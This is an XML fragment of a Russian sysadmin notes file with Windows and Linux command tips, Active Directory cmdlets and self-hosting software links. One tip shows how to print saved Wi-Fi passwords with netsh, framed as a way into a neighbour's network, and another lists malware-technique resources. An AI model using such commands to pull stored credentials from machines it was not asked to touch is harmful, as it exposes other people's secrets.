      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">xcopy %old_dir% %new_dir% /i /e /h /y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">xcopy "C:\ExampleProgramPortable\example_program.lnk" C:\Users\Public\Desktop</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">rename "C:\Users\Public\Desktop\example_program.lnk" </text:span><text:span text:style-name="T3">Программа</text:span><text:span text:style-name="T2">.lnk</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo %date% %time:~-11,8% Example Program install successful &gt;&gt; M:\logs\%username%.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16">)</text:p>
      <text:p text:style-name="P16">Как просмотреть пароли от всех Wi-Fi, к которым вы подключались? Если вы забыли пароль от Wi-Fi соседа, а подключиться ну очень надо, есть отличный лайфхак с консолью Windows. Алгоритм действий такой:</text:p>
      <text:p text:style-name="P1">1. Нажмите сочетание «Win+R» и введите команду «cmd», чтобы открыть командную строку.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">2. </text:span><text:span text:style-name="T3">Введите</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">команду</text:span><text:span text:style-name="T2"> «netsh wlan show profiles». </text:span><text:span text:style-name="T3">На экране вы увидите список всех известных Wi-Fi сетей. Запомните имя нужной вам сети.</text:span></text:p>
      <text:p text:style-name="P1">3. Затем введите «netsh wlan show profile name=&lt;имя_сети&gt; key=clear». Команда выведет всю известную информацию о данной сети. В поле «Содержимое ключа» будет указан последний пароль, с которым вы подключались к этой сети.</text:p>
      <text:p text:style-name="P7">Служба WlanSvc в операционной системе Windows управляет всеми беспроводными соединениями (по Wi-Fi и Bluetooth). То есть, сервис отвечает за поиск, подключение, отключение и другие операции, которые необходимы для работы беспроводных подключений на компьютере.</text:p>
      <text:p text:style-name="P1">10 недооцененных ресурсов о методах вредоносного ПО. Это список различных ресурсов, где можно узнать больше о методах вредоносных программ, о том, как их анализировать и как улучшить обнаружение</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">unprotect.it</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lolbas-project.github.io</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">hijacklibs.net</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">malapi.io</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">lots-project.com</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">github.com/Karneades/awesome-malware-persistence</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">github.com/m0nad/awesome-privilege-escalation</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">github.com/stuhli/awesome-event-ids</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">orkl.eu</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">vx-underground.org/windows.html</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">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18"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1">Черный экран на терминальном сервере windows server 2019</text:p>
      <text:p text:style-name="P1">Данная проблема возникает из-за большого количества правил для Cortana в ветке реестра:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Данные правила создаются при входе на терминальный сервер и должны удаляться при выходе, но увы этого не происходит</text:p>
      <text:p text:style-name="P1">Удаляем ветку и заново ее создаем:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\AppIso\FirewallRules"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">New-Item "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\AppIso\FirewallRules"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Создаем дополнительный ключ реестра, чтобы правила больше не создавались повторно:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" -Name "DeleteUserAppContainersOnLogoff" -Value ”1” <text:s/>-PropertyType "DWord"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">Перезагружаемся </text:p>
      <text:p text:style-name="P1">Управление сервисами systemd через утилиту systemctl</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl start name.service - </text:span><text:span text:style-name="T3">запуск</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl stop name.service - </text:span><text:span text:style-name="T3">остановка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl restart name.service - </text:span><text:span text:style-name="T3">перезапуск</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl try-restart name.service - </text:span><text:span text:style-name="T3">перезапуск</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">только</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">если</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">он</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запущен</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">systemctl reload name.service - </text:span><text:span text:style-name="T3">перезагрузка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">конфигурации</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span></text:p>
      <text:p text:style-name="P1">systemctl status name.service - проверка, запущен ли сервис с детальным выводом состояния сервиса</text:p>
      <text:p text:style-name="P1">systemctl is-active name.service - проверка, запущен ли сервис с простым ответом: active или inactive</text:p>
      <text:p text:style-name="P13">systemctl list-units --type service --all - отображение статуса всех сервисов</text:p>
      <text:p text:style-name="P13">systemctl enable name.service - активирует сервис (позволяет стартовать во время запуска системы)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl disable name.service - </text:span><text:span text:style-name="T3">деактивирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервис</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl reenable name.service - </text:span><text:span text:style-name="T3">деактивирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервис</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сразу</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">активирует</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">его</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl is–enabled name.service - </text:span><text:span text:style-name="T3">проверяет</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">активирован</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ли</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервис</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl list-unit-files --type service - </text:span><text:span text:style-name="T3">отображает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">все</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервисы</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">проверяет</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">какие</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">них</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">активированы</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl mask name.service - </text:span><text:span text:style-name="T3">заменяет</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">симлинком</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> /dev/null, </text:span><text:span text:style-name="T3">делая</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">юнит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">недоступным</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> systemd</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">systemctl unmask name.service - </text:span><text:span text:style-name="T3">возвращает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">файл</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сервиса</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">делая</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">юнит</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">доступным</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> system</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Полезные сетевые утилиты </text:span><text:span text:style-name="T2">linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Утилита управляет интерфейсами, сетевыми устройствами и туннелями. Всем сетевым стеком </text:span><text:span text:style-name="T2">linux</text:span><text:span text:style-name="T3">. Например: </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">addr</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Покажет список всех сетевых адресов. Тоже самое делает утилита </text:span><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3"> без параметров. </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Покажет таблицу роутинга. Тоже самое сделает команда </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3">. </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">link</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">set</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">eth</text:span><text:span text:style-name="T3">0 </text:span><text:span text:style-name="T2">up</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Поднимает интерфейс </text:span><text:span text:style-name="T2">eth</text:span><text:span text:style-name="T3">0. Это можно также сделать с помощью </text:span><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3">. </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Так зачем она нужна если все ее команды можно выполнить с помощью других утилит? Дело в том, что во многие компактные дистрибутивы (например </text:span><text:span text:style-name="T2">Alpine</text:span><text:span text:style-name="T3"> или </text:span><text:span text:style-name="T2">openwrt</text:span><text:span text:style-name="T3">) не используют </text:span><text:span text:style-name="T2">ifconfig</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">route</text:span><text:span text:style-name="T3"> и другие “большие” утилит. Там оставляют только </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3">. Вот с помощью нее и придется выполнять все сетевые задачи. </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Полное имя </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3"> - на него она тоже откликается. Это утилита, позволяет слушать и выполнять </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">UDP</text:span><text:span text:style-name="T3"> соединении. </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">И так что может </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3">? </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Открываем одно окно терминала и делаем там </text:span><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> 12345 это будет наш сервер. Отрываем другое окно и пишем в нем </text:span><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T3"> 127.0.0.1 12345 - это наш клиент. Печатаем там “</text:span><text:span text:style-name="T2">Hello</text:span><text:span text:style-name="T3">!” нажимаем </text:span><text:span text:style-name="T2">enter</text:span><text:span text:style-name="T3">. В первом окне видим эту фразу. Ура! Мы написали однонаправленный чат.</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Эта утилита пригодиться чтобы проверить жив ли сервер и слушает ли от вообще на этом порту? С помощью </text:span><text:span text:style-name="T2">nc</text:span><text:span text:style-name="T3"> можно переслать файл и даже просканировать порты. </text:span><text:span text:style-name="T2">Http</text:span><text:span text:style-name="T3"> сервер еще можно написать.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Это труба, которая позволяет соединить два сокета между собой. </text:span><text:span text:style-name="T2">Mysql</text:span><text:span text:style-name="T3"> слушает только на </text:span><text:span text:style-name="T2">local</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">socket</text:span><text:span text:style-name="T3"> а мы хотим на его ходить по </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3">. Выглядит это так: </text:span><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">LISTEN</text:span><text:span text:style-name="T3">:3307,</text:span><text:span text:style-name="T2">reuseaddr</text:span><text:span text:style-name="T3">,</text:span><text:span text:style-name="T2">fork</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">UNIX</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">CONNECT</text:span><text:span text:style-name="T3">:/</text:span><text:span text:style-name="T2">var</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">lib</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mysql</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mysql</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">sock</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Конектор к </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3"> из предыдущего примера: </text:span><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3">4:127.0.0.1:80 </text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Если вам нужно перебросить сокет в другое место присмотритесь к </text:span><text:span text:style-name="T2">socat</text:span><text:span text:style-name="T3"> он вам скорее всего поможет.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Эта утилита показывает текущее состояние сетевого стека. Она даст вам ответ на вопросы: что у меня там на порту 9081 висит? </text:span><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">nltp</text:span><text:span text:style-name="T3"> Что с моими </text:span><text:span text:style-name="T2">tcp</text:span><text:span text:style-name="T3"> соединениями и кто прямо сейчас ко мне подключен? </text:span><text:span text:style-name="T2">netstat</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">atp</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">У этой утилиты есть младший (или старший по возможностям) брат </text:span><text:span text:style-name="T2">ss</text:span><text:span text:style-name="T3"> посмотрите на него тоже может он понравиться больше.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Утилита для передачи файлов. Так написано в ее описании. Чем же она замечательна? Она умеет кучу протоколов: </text:span><text:span text:style-name="T2">DICT</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FILE</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">FTPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">GOPHER</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">HTTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">HTTPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">IMAP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">IMAPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">LDAP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">LDAPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">POP</text:span><text:span text:style-name="T3">3, </text:span><text:span text:style-name="T2">POP</text:span><text:span text:style-name="T3">3</text:span><text:span text:style-name="T2">S</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">RTMP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">RTSP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SCP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SFTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMB</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMBS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMTP</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">SMTPS</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">TELNET</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">and</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">TFTP</text:span><text:span text:style-name="T3">. В каждом протоколе она знает множество версий, например </text:span><text:span text:style-name="T2">HTTP</text:span><text:span text:style-name="T3"> она может до версии 2. Умеет подставлять хидера, куки, ходить по </text:span><text:span text:style-name="T2">SSL</text:span><text:span text:style-name="T3">, использовать </text:span><text:span text:style-name="T2">proxy</text:span><text:span text:style-name="T3"> разных видов. Можно отлаживать </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">(</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3">) соединение с помощью -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3">. Примеры: </text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">artscene</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">textfiles</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">asciiart</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">unicorn</text:span><text:span text:style-name="T3"> </text:span></text:p>
      <text:p text:style-name="P1">Единорог! </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://127.0.0.1:12345 </text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Соединяемся с сервером из примера </text:span><text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T3">. В консоле сервера увидим </text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3"> запрос. После этого все остановиться </text:span><text:span text:style-name="T2">curl</text:span><text:span text:style-name="T3"> будет ждать ответ. И если вы руками его введете покажет его.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как создать файл произвольного размера в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">?</text:span></text:p>
      <text:p text:style-name="P1">Для тестирования скорости приема/передачи данных между двумя серверами необязательно искать большой файл, можно просто создать его в течение пятидесяти секунд.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Чтобы создать файл определенного размера есть несколько способов, использующих разные утилиты. Для примера создадим два тестовых файла размером в 10М</text:span><text:span text:style-name="T2">B</text:span><text:span text:style-name="T3"> с помощью наиболее популярных утилит «</text:span><text:span text:style-name="T2">fallocate</text:span><text:span text:style-name="T3">» и «</text:span><text:span text:style-name="T2">truncate</text:span><text:span text:style-name="T3">».</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Fallocate</text:span><text:span text:style-name="T3"> используется для манипулирования выделенным дисковым пространством для файла, чтобы освободить или предварительно выделить его. Команда для создания файла будет иметь вид «</text:span><text:span text:style-name="T2">fallocate</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> 10</text:span><text:span text:style-name="T2">M</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3">».</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Truncate</text:span><text:span text:style-name="T3"> используется для уменьшения или расширения размера файла до указанного размера. Чтобы создать файл размером 10</text:span><text:span text:style-name="T2">MB</text:span><text:span text:style-name="T3">, будем использовать </text:span><text:soft-page-break/><text:span text:style-name="T3">команду «</text:span><text:span text:style-name="T2">truncate</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> 10</text:span><text:span text:style-name="T2">MB</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">test</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">_2.</text:span><text:span text:style-name="T2">txt</text:span><text:span text:style-name="T3">». Используйте команду «</text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3">», чтобы проверить заданный размер файлов.</text:span></text:p>
      <text:p text:style-name="P1">Размер допустимо задавать обозначениями:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s/></text:span><text:span text:style-name="T2">• KB • KiB • K</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • MB • MiB • M</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>• GB • GiB • G</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • TB • TiB • T</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • PB • PiB • P</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"> • ZB • ZiB • Z</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"> • YB • YiB • Y</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Полезные команды Powershell для Active Directory:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Получить всех пользователей </text:span><text:span text:style-name="T2">AD</text:span><text:span text:style-name="T3"> в домене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15">Модуль импорта Active Directory -- Import-module activedirectory</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получить все компьютеры из домена -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">adcomputer</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">properties</text:span><text:span text:style-name="T3"> * -</text:span><text:span text:style-name="T2">filter</text:span><text:span text:style-name="T3"> *</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отключить пользователя </text:span><text:span text:style-name="T2">AD</text:span><text:span text:style-name="T3"> по имени учетной записи </text:span><text:span text:style-name="T2">SAM</text:span><text:span text:style-name="T3"> -- </text:span><text:span text:style-name="T2">Disable</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ADaccount</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">identity</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">Name</text:span><text:span text:style-name="T3">"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Экспорт данных в формат CSV -- Get-adcomputer -properties * -filter * |export-csv "give path"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Получить имя учетной записи AD Groups SAM -- Get-ADgroup -identity "provide group name"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Выбрать конкретный атрибут пользователя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2"><text:span text:style-name="T3">Получить информацию о домене -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ADdomain</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Установите роль Active Directory -- Install-windowsfeature AD-Domain-Services</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Получить список контроллеров домена -- </text:span><text:span text:style-name="T2">Get</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ADDomainController</text:span></text:p>
      <text:p text:style-name="P1">Полезный софт для самохостинга:</text:p>
      <text:p text:style-name="P1">Home Assistant (https://github.com/home-assistant/core) и Node-RED (https://github.com/node-red/node-red) - управление умным домом.</text:p>
      <text:p text:style-name="P1">Pi-hole (https://github.com/pi-hole/pi-hole) - фильтрация интернет-трафика во всей сети, блокировка рекламы.</text:p>
      <text:p text:style-name="P1">Plex (https://github.com/plexinc/pms-docker) - проприетарный медиасервер для стриминга (в качестве свободной альтернативы можно использовать Jellyfin (https://github.com/jellyfin/jellyfin)).</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Transmission (https://github.com/transmission/transmission) - быстрый и простой торрент-клиент, с ним интегрируется менеджер/индексатор Radarr (https://github.com/Radarr/Radarr) или Sonarr (https://github.com/Sonarr/Sonarr) для мониторинга RSS-раздач и автоматического скачивания новых эпизодов. Всё это сразу подгружается в Plex/Jellyfin. Есть ещё менеджер Lidarr (https://github.com/Lidarr/Lidarr) - то же самое, только для музыки, и Prowlarr </text:span><text:soft-page-break/><text:span text:style-name="T3">(https://github.com/Prowlarr/Prowlarr) для интеграции Lidarr, Mylar3, Radarr, Readarr и Sonarr в одном интерфейсе.</text:span></text:p>
